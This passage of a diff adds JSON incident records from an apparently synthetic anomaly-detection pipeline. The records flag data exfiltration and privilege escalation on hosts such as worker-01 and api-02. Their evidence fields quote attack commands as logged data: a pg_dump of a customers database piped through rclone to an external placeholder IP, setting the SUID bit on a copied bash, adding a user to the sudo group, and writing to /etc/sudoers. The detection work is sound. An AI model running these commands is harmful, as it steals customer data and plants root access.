+        "host":"worker-01",
+        "timestamp":"2026-01-15T02:55:10.703253+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1864 MB sent to external 198.51.100.252:443",
+        "evidence":"ESTABLISHED 10.0.1.15:40985 -> 198.51.100.252:443 proto=tcp bytes_out=1864000000 process=rclone",
+        "source_ip":"198.51.100.252"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-15T02:55:59.583846+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1521 MB sent to external 198.51.100.252:443",
+        "evidence":"ESTABLISHED 10.0.1.15:52265 -> 198.51.100.252:443 proto=tcp bytes_out=1521000000 process=rclone",
+        "source_ip":"198.51.100.252"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-15T02:56:07.898395+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"2137 MB sent to external 198.51.100.252:8443",
+        "evidence":"ESTABLISHED 10.0.1.15:49171 -> 198.51.100.252:8443 proto=tcp bytes_out=2137000000 process=rclone",
+        "source_ip":"198.51.100.252"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-15T02:56:30.950367+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1521 MB sent to external 198.51.100.252:4444",
+        "evidence":"ESTABLISHED 10.0.1.15:49919 -> 198.51.100.252:4444 proto=tcp bytes_out=1521000000 process=rclone",
+        "source_ip":"198.51.100.252"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-15T02:57:56.534091+00:00",
+        "rule_id":"EXFIL-001",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"Database dump piped to an external uploader",
+        "evidence":"type=EXECVE uid=svc_report cmd=\"pg_dump -Fc customers | rclone rcat remote:198.51.100.252\/drop\/customers.dump\"",
+        "source_ip":"198.51.100.252"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-15T02:58:03.478148+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1120 MB sent to external 198.51.100.252:443",
+        "evidence":"ESTABLISHED 10.0.1.15:54711 -> 198.51.100.252:443 proto=tcp bytes_out=1120000000 process=rclone",
+        "source_ip":"198.51.100.252"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-15T02:58:03.520684+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"2158 MB sent to external 198.51.100.252:443",
+        "evidence":"ESTABLISHED 10.0.1.15:56162 -> 198.51.100.252:443 proto=tcp bytes_out=2158000000 process=rclone",
+        "source_ip":"198.51.100.252"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-15T02:59:24.163351+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1734 MB sent to external 198.51.100.252:21",
+        "evidence":"ESTABLISHED 10.0.1.15:43440 -> 198.51.100.252:21 proto=tcp bytes_out=1734000000 process=rclone",
+        "source_ip":"198.51.100.252"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-15T03:00:39.047703+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1844 MB sent to external 198.51.100.252:443",
+        "evidence":"ESTABLISHED 10.0.1.15:56016 -> 198.51.100.252:443 proto=tcp bytes_out=1844000000 process=rclone",
+        "source_ip":"198.51.100.252"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-15T03:00:42.923728+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"2185 MB sent to external 198.51.100.252:8443",
+        "evidence":"ESTABLISHED 10.0.1.15:48154 -> 198.51.100.252:8443 proto=tcp bytes_out=2185000000 process=rclone",
+        "source_ip":"198.51.100.252"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-15T03:02:10.001254+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1353 MB sent to external 198.51.100.252:443",
+        "evidence":"ESTABLISHED 10.0.1.15:57037 -> 198.51.100.252:443 proto=tcp bytes_out=1353000000 process=rclone",
+        "source_ip":"198.51.100.252"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-15T03:02:13.838236+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1370 MB sent to external 198.51.100.252:443",
+        "evidence":"ESTABLISHED 10.0.1.15:47966 -> 198.51.100.252:443 proto=tcp bytes_out=1370000000 process=rclone",
+        "source_ip":"198.51.100.252"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-15T03:03:45.307982+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1811 MB sent to external 198.51.100.252:443",
+        "evidence":"ESTABLISHED 10.0.1.15:41828 -> 198.51.100.252:443 proto=tcp bytes_out=1811000000 process=rclone",
+        "source_ip":"198.51.100.252"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-15T03:03:59.468923+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1373 MB sent to external 198.51.100.252:8443",
+        "evidence":"ESTABLISHED 10.0.1.15:48556 -> 198.51.100.252:8443 proto=tcp bytes_out=1373000000 process=rclone",
+        "source_ip":"198.51.100.252"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-15T03:04:59.077607+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"2133 MB sent to external 198.51.100.252:8443",
+        "evidence":"ESTABLISHED 10.0.1.15:55630 -> 198.51.100.252:8443 proto=tcp bytes_out=2133000000 process=rclone",
+        "source_ip":"198.51.100.252"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-15T03:05:19.875721+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1953 MB sent to external 198.51.100.252:443",
+        "evidence":"ESTABLISHED 10.0.1.15:46227 -> 198.51.100.252:443 proto=tcp bytes_out=1953000000 process=rclone",
+        "source_ip":"198.51.100.252"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-15T03:06:01.774011+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"2201 MB sent to external 198.51.100.252:4444",
+        "evidence":"ESTABLISHED 10.0.1.15:52231 -> 198.51.100.252:4444 proto=tcp bytes_out=2201000000 process=rclone",
+        "source_ip":"198.51.100.252"
+      },
+      {
+        "host":"worker-01",
+        "timestamp":"2026-01-15T03:06:21.078220+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1317 MB sent to external 198.51.100.252:443",
+        "evidence":"ESTABLISHED 10.0.1.15:43596 -> 198.51.100.252:443 proto=tcp bytes_out=1317000000 process=rclone",
+        "source_ip":"198.51.100.252"
+      }
+    ]
+  },
+  {
+    "key":"api-01:privilege_escalation:20260115T0410",
+    "host":"api-01",
+    "role":"api",
+    "start":"2026-01-15T04:10:00+00:00",
+    "end":"2026-01-15T04:25:00+00:00",
+    "peak_score":0.8664,
+    "detectors":[
+      "isolation_forest",
+      "security_rules"
+    ],
+    "suspected_type":"privilege_escalation",
+    "category":"security",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"failed_logins",
+        "z":1.86
+      },
+      {
+        "metric":"process_count",
+        "z":0.99
+      },
+      {
+        "metric":"cpu_pct",
+        "z":0.72
+      },
+      {
+        "metric":"net_out_mbps",
+        "z":0.7
+      }
+    ],
+    "findings":[
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-15T04:10:07.069415+00:00",
+        "rule_id":"PRIVESC-003",
+        "incident_type":"privilege_escalation",
+        "severity":"critical",
+        "description":"User added to sudo group",
+        "evidence":"type=EXECVE uid=0 auid=33 cmd=\"usermod -aG sudo sysbackup\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-15T04:10:54.737900+00:00",
+        "rule_id":"PRIVESC-004",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"SUID enumeration or SUID bit set",
+        "evidence":"type=EXECVE uid=33 cmd=\"chmod u+s \/tmp\/.x\/bash\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-15T04:11:15.091717+00:00",
+        "rule_id":"PRIVESC-001",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"Unauthorised sudo attempt",
+        "evidence":"www-data : user NOT in sudoers ; TTY=unknown ; PWD=\/var\/www ; USER=root ; COMMAND=\/bin\/bash",
+        "source_ip":null
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-15T04:11:19.258923+00:00",
+        "rule_id":"PRIVESC-004",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"SUID enumeration or SUID bit set",
+        "evidence":"type=EXECVE uid=33 cmd=\"chmod u+s \/tmp\/.x\/bash\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-15T04:12:16.131389+00:00",
+        "rule_id":"PRIVESC-004",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"SUID enumeration or SUID bit set",
+        "evidence":"type=EXECVE uid=www-data cmd=\"find \/ -perm -4000 -type f\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-15T04:12:39.802062+00:00",
+        "rule_id":"PRIVESC-002",
+        "incident_type":"privilege_escalation",
+        "severity":"critical",
+        "description":"sudoers file modified",
+        "evidence":"type=PATH name=\/etc\/sudoers op=write uid=33 (www-data)",
+        "source_ip":null
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-15T04:13:00.986914+00:00",
+        "rule_id":"PRIVESC-003",
+        "incident_type":"privilege_escalation",
+        "severity":"critical",
+        "description":"User added to sudo group",
+        "evidence":"type=EXECVE uid=0 auid=33 cmd=\"usermod -aG sudo sysbackup\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-15T04:13:17.136729+00:00",
+        "rule_id":"PRIVESC-004",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"SUID enumeration or SUID bit set",
+        "evidence":"type=EXECVE uid=33 cmd=\"chmod u+s \/tmp\/.x\/bash\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-15T04:13:31.241478+00:00",
+        "rule_id":"PRIVESC-002",
+        "incident_type":"privilege_escalation",
+        "severity":"critical",
+        "description":"sudoers file modified",
+        "evidence":"type=PATH name=\/etc\/sudoers op=write uid=33 (www-data)",
+        "source_ip":null
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-15T04:13:33.997041+00:00",
+        "rule_id":"PRIVESC-001",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"Unauthorised sudo attempt",
+        "evidence":"www-data : user NOT in sudoers ; TTY=unknown ; PWD=\/var\/www ; USER=root ; COMMAND=\/bin\/bash",
+        "source_ip":null
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-15T04:14:01.578862+00:00",
+        "rule_id":"PRIVESC-001",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"Unauthorised sudo attempt",
+        "evidence":"www-data : user NOT in sudoers ; TTY=unknown ; PWD=\/var\/www ; USER=root ; COMMAND=\/bin\/bash",
+        "source_ip":null
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-15T04:15:16.381812+00:00",
+        "rule_id":"PRIVESC-004",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"SUID enumeration or SUID bit set",
+        "evidence":"type=EXECVE uid=33 cmd=\"chmod u+s \/tmp\/.x\/bash\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-15T04:15:41.448377+00:00",
+        "rule_id":"PRIVESC-002",
+        "incident_type":"privilege_escalation",
+        "severity":"critical",
+        "description":"sudoers file modified",
+        "evidence":"type=PATH name=\/etc\/sudoers op=write uid=33 (www-data)",
+        "source_ip":null
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-15T04:16:45.882487+00:00",
+        "rule_id":"PRIVESC-004",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"SUID enumeration or SUID bit set",
+        "evidence":"type=EXECVE uid=www-data cmd=\"find \/ -perm -4000 -type f\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-15T04:17:02.510323+00:00",
+        "rule_id":"PRIVESC-001",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"Unauthorised sudo attempt",
+        "evidence":"www-data : user NOT in sudoers ; TTY=unknown ; PWD=\/var\/www ; USER=root ; COMMAND=\/bin\/bash",
+        "source_ip":null
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-15T04:17:26.676984+00:00",
+        "rule_id":"PRIVESC-003",
+        "incident_type":"privilege_escalation",
+        "severity":"critical",
+        "description":"User added to sudo group",
+        "evidence":"type=EXECVE uid=0 auid=33 cmd=\"usermod -aG sudo sysbackup\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-15T04:17:28.082393+00:00",
+        "rule_id":"PRIVESC-004",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"SUID enumeration or SUID bit set",
+        "evidence":"type=EXECVE uid=www-data cmd=\"find \/ -perm -4000 -type f\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-15T04:17:30.231845+00:00",
+        "rule_id":"PRIVESC-002",
+        "incident_type":"privilege_escalation",
+        "severity":"critical",
+        "description":"sudoers file modified",
+        "evidence":"type=PATH name=\/etc\/sudoers op=write uid=33 (www-data)",
+        "source_ip":null
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-15T04:18:13.962309+00:00",
+        "rule_id":"PRIVESC-003",
+        "incident_type":"privilege_escalation",
+        "severity":"critical",
+        "description":"User added to sudo group",
+        "evidence":"type=EXECVE uid=0 auid=33 cmd=\"usermod -aG sudo sysbackup\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-01",
+        "timestamp":"2026-01-15T04:18:20.216958+00:00",
+        "rule_id":"PRIVESC-004",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"SUID enumeration or SUID bit set",
+        "evidence":"type=EXECVE uid=33 cmd=\"chmod u+s \/tmp\/.x\/bash\"",
+        "source_ip":null
+      }
+    ]
+  },
+  {
+    "key":"api-02:data_exfiltration:20260115T0423",
+    "host":"api-02",
+    "role":"api",
+    "start":"2026-01-15T04:23:00+00:00",
+    "end":"2026-01-15T05:18:00+00:00",
+    "peak_score":5.8537,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder",
+      "security_rules"
+    ],
+    "suspected_type":"data_exfiltration",
+    "category":"security",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"net_out_mbps",
+        "z":45.59
+      },
+      {
+        "metric":"cpu_pct",
+        "z":1.91
+      },
+      {
+        "metric":"process_count",
+        "z":1.26
+      },
+      {
+        "metric":"error_rate_pct",
+        "z":0.58
+      }
+    ],
+    "findings":[
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T04:23:18.264281+00:00",
+        "rule_id":"EXFIL-001",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"Database dump piped to an external uploader",
+        "evidence":"type=EXECVE uid=svc_report cmd=\"pg_dump -Fc customers | rclone rcat remote:192.0.2.252\/drop\/customers.dump\"",
+        "source_ip":"192.0.2.252"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T04:23:23.619995+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1610 MB sent to external 192.0.2.252:21",
+        "evidence":"ESTABLISHED 10.0.1.13:44406 -> 192.0.2.252:21 proto=tcp bytes_out=1610000000 process=rclone",
+        "source_ip":"192.0.2.252"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T04:24:02.661381+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1976 MB sent to external 192.0.2.252:8443",
+        "evidence":"ESTABLISHED 10.0.1.13:48158 -> 192.0.2.252:8443 proto=tcp bytes_out=1976000000 process=rclone",
+        "source_ip":"192.0.2.252"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T04:24:52.525587+00:00",
+        "rule_id":"EXFIL-001",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"Database dump piped to an external uploader",
+        "evidence":"type=EXECVE uid=svc_report cmd=\"pg_dump -Fc customers | rclone rcat remote:192.0.2.252\/drop\/customers.dump\"",
+        "source_ip":"192.0.2.252"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T04:25:07.404525+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1234 MB sent to external 192.0.2.252:443",
+        "evidence":"ESTABLISHED 10.0.1.13:57073 -> 192.0.2.252:443 proto=tcp bytes_out=1234000000 process=rclone",
+        "source_ip":"192.0.2.252"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T04:26:05.050793+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1618 MB sent to external 192.0.2.252:4444",
+        "evidence":"ESTABLISHED 10.0.1.13:58039 -> 192.0.2.252:4444 proto=tcp bytes_out=1618000000 process=rclone",
+        "source_ip":"192.0.2.252"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T04:26:19.680851+00:00",
+        "rule_id":"EXFIL-001",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"Database dump piped to an external uploader",
+        "evidence":"type=EXECVE uid=svc_report cmd=\"pg_dump -Fc customers | rclone rcat remote:192.0.2.252\/drop\/customers.dump\"",
+        "source_ip":"192.0.2.252"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T04:26:31.892004+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"2038 MB sent to external 192.0.2.252:21",
+        "evidence":"ESTABLISHED 10.0.1.13:54558 -> 192.0.2.252:21 proto=tcp bytes_out=2038000000 process=rclone",
+        "source_ip":"192.0.2.252"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T04:26:53.032083+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1927 MB sent to external 192.0.2.252:443",
+        "evidence":"ESTABLISHED 10.0.1.13:59343 -> 192.0.2.252:443 proto=tcp bytes_out=1927000000 process=rclone",
+        "source_ip":"192.0.2.252"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T04:27:04.202175+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1522 MB sent to external 192.0.2.252:4444",
+        "evidence":"ESTABLISHED 10.0.1.13:56384 -> 192.0.2.252:4444 proto=tcp bytes_out=1522000000 process=rclone",
+        "source_ip":"192.0.2.252"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T04:27:20.842367+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1899 MB sent to external 192.0.2.252:21",
+        "evidence":"ESTABLISHED 10.0.1.13:59296 -> 192.0.2.252:21 proto=tcp bytes_out=1899000000 process=rclone",
+        "source_ip":"192.0.2.252"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T04:27:34.724020+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1570 MB sent to external 192.0.2.252:4444",
+        "evidence":"ESTABLISHED 10.0.1.13:51643 -> 192.0.2.252:4444 proto=tcp bytes_out=1570000000 process=rclone",
+        "source_ip":"192.0.2.252"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T04:27:50.687734+00:00",
+        "rule_id":"EXFIL-001",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"Database dump piped to an external uploader",
+        "evidence":"type=EXECVE uid=svc_report cmd=\"pg_dump -Fc customers | rclone rcat remote:192.0.2.252\/drop\/customers.dump\"",
+        "source_ip":"192.0.2.252"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T04:29:41.381504+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1536 MB sent to external 192.0.2.252:21",
+        "evidence":"ESTABLISHED 10.0.1.13:49740 -> 192.0.2.252:21 proto=tcp bytes_out=1536000000 process=rclone",
+        "source_ip":"192.0.2.252"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T04:29:42.095529+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1821 MB sent to external 192.0.2.252:8443",
+        "evidence":"ESTABLISHED 10.0.1.13:46015 -> 192.0.2.252:8443 proto=tcp bytes_out=1821000000 process=rclone",
+        "source_ip":"192.0.2.252"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T04:30:10.238293+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1539 MB sent to external 192.0.2.252:21",
+        "evidence":"ESTABLISHED 10.0.1.13:44289 -> 192.0.2.252:21 proto=tcp bytes_out=1539000000 process=rclone",
+        "source_ip":"192.0.2.252"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T04:31:07.833004+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"2021 MB sent to external 192.0.2.252:8443",
+        "evidence":"ESTABLISHED 10.0.1.13:52953 -> 192.0.2.252:8443 proto=tcp bytes_out=2021000000 process=rclone",
+        "source_ip":"192.0.2.252"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T04:31:08.805673+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1356 MB sent to external 192.0.2.252:4444",
+        "evidence":"ESTABLISHED 10.0.1.13:53420 -> 192.0.2.252:4444 proto=tcp bytes_out=1356000000 process=rclone",
+        "source_ip":"192.0.2.252"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T04:31:30.584001+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1916 MB sent to external 192.0.2.252:8443",
+        "evidence":"ESTABLISHED 10.0.1.13:43119 -> 192.0.2.252:8443 proto=tcp bytes_out=1916000000 process=rclone",
+        "source_ip":"192.0.2.252"
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T04:31:46.997441+00:00",
+        "rule_id":"EXFIL-002",
+        "incident_type":"data_exfiltration",
+        "severity":"critical",
+        "description":"1968 MB sent to external 192.0.2.252:443",
+        "evidence":"ESTABLISHED 10.0.1.13:49044 -> 192.0.2.252:443 proto=tcp bytes_out=1968000000 process=rclone",
+        "source_ip":"192.0.2.252"
+      }
+    ]
+  },
+  {
+    "key":"api-02:latency_degradation:20260115T0525",
+    "host":"api-02",
+    "role":"api",
+    "start":"2026-01-15T05:25:00+00:00",
+    "end":"2026-01-15T05:27:00+00:00",
+    "peak_score":1.0413,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"latency_degradation",
+    "category":"operational",
+    "severity":"medium",
+    "top_metrics":[
+      {
+        "metric":"process_count",
+        "z":-2.7
+      },
+      {
+        "metric":"error_rate_pct",
+        "z":2.64
+      },
+      {
+        "metric":"disk_pct",
+        "z":-0.91
+      },
+      {
+        "metric":"latency_p95_ms",
+        "z":0.84
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"web-02:latency_degradation:20260115T0727",
+    "host":"web-02",
+    "role":"web",
+    "start":"2026-01-15T07:27:00+00:00",
+    "end":"2026-01-15T08:07:00+00:00",
+    "peak_score":4.2706,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder"
+    ],
+    "suspected_type":"latency_degradation",
+    "category":"operational",
+    "severity":"high",
+    "top_metrics":[
+      {
+        "metric":"latency_p95_ms",
+        "z":24.46
+      },
+      {
+        "metric":"error_rate_pct",
+        "z":4.87
+      },
+      {
+        "metric":"cpu_pct",
+        "z":1.09
+      },
+      {
+        "metric":"requests_per_sec",
+        "z":-0.56
+      }
+    ],
+    "findings":[
+
+    ]
+  },
+  {
+    "key":"api-02:privilege_escalation:20260115T0733",
+    "host":"api-02",
+    "role":"api",
+    "start":"2026-01-15T07:33:00+00:00",
+    "end":"2026-01-15T07:42:00+00:00",
+    "peak_score":1.327,
+    "detectors":[
+      "isolation_forest",
+      "lstm_autoencoder",
+      "security_rules"
+    ],
+    "suspected_type":"privilege_escalation",
+    "category":"security",
+    "severity":"critical",
+    "top_metrics":[
+      {
+        "metric":"failed_logins",
+        "z":2.67
+      },
+      {
+        "metric":"process_count",
+        "z":2.21
+      },
+      {
+        "metric":"disk_pct",
+        "z":-0.94
+      },
+      {
+        "metric":"net_in_mbps",
+        "z":0.72
+      }
+    ],
+    "findings":[
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T07:33:30.145923+00:00",
+        "rule_id":"PRIVESC-002",
+        "incident_type":"privilege_escalation",
+        "severity":"critical",
+        "description":"sudoers file modified",
+        "evidence":"type=PATH name=\/etc\/sudoers op=write uid=33 (www-data)",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T07:33:39.249797+00:00",
+        "rule_id":"PRIVESC-004",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"SUID enumeration or SUID bit set",
+        "evidence":"type=EXECVE uid=33 cmd=\"chmod u+s \/tmp\/.x\/bash\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T07:33:59.333271+00:00",
+        "rule_id":"PRIVESC-003",
+        "incident_type":"privilege_escalation",
+        "severity":"critical",
+        "description":"User added to sudo group",
+        "evidence":"type=EXECVE uid=0 auid=33 cmd=\"usermod -aG sudo sysbackup\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T07:34:35.277880+00:00",
+        "rule_id":"PRIVESC-004",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"SUID enumeration or SUID bit set",
+        "evidence":"type=EXECVE uid=33 cmd=\"chmod u+s \/tmp\/.x\/bash\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T07:34:39.947491+00:00",
+        "rule_id":"PRIVESC-003",
+        "incident_type":"privilege_escalation",
+        "severity":"critical",
+        "description":"User added to sudo group",
+        "evidence":"type=EXECVE uid=0 auid=33 cmd=\"usermod -aG sudo sysbackup\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T07:35:41.326628+00:00",
+        "rule_id":"PRIVESC-002",
+        "incident_type":"privilege_escalation",
+        "severity":"critical",
+        "description":"sudoers file modified",
+        "evidence":"type=PATH name=\/etc\/sudoers op=write uid=33 (www-data)",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T07:36:04.468449+00:00",
+        "rule_id":"PRIVESC-001",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"Unauthorised sudo attempt",
+        "evidence":"www-data : user NOT in sudoers ; TTY=unknown ; PWD=\/var\/www ; USER=root ; COMMAND=\/bin\/bash",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T07:36:09.863312+00:00",
+        "rule_id":"PRIVESC-004",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"SUID enumeration or SUID bit set",
+        "evidence":"type=EXECVE uid=33 cmd=\"chmod u+s \/tmp\/.x\/bash\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T07:37:20.623199+00:00",
+        "rule_id":"PRIVESC-003",
+        "incident_type":"privilege_escalation",
+        "severity":"critical",
+        "description":"User added to sudo group",
+        "evidence":"type=EXECVE uid=0 auid=33 cmd=\"usermod -aG sudo sysbackup\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T07:37:55.813351+00:00",
+        "rule_id":"PRIVESC-004",
+        "incident_type":"privilege_escalation",
+        "severity":"high",
+        "description":"SUID enumeration or SUID bit set",
+        "evidence":"type=EXECVE uid=33 cmd=\"chmod u+s \/tmp\/.x\/bash\"",
+        "source_ip":null
+      },
+      {
+        "host":"api-02",
+        "timestamp":"2026-01-15T07:38:24.260452+00:00",
+        "rule_id":"PRIVESC-002",
+        "incident_type":"privilege_escalation",
+        "severity":"critical",
+        "description":"sudoers file modified",
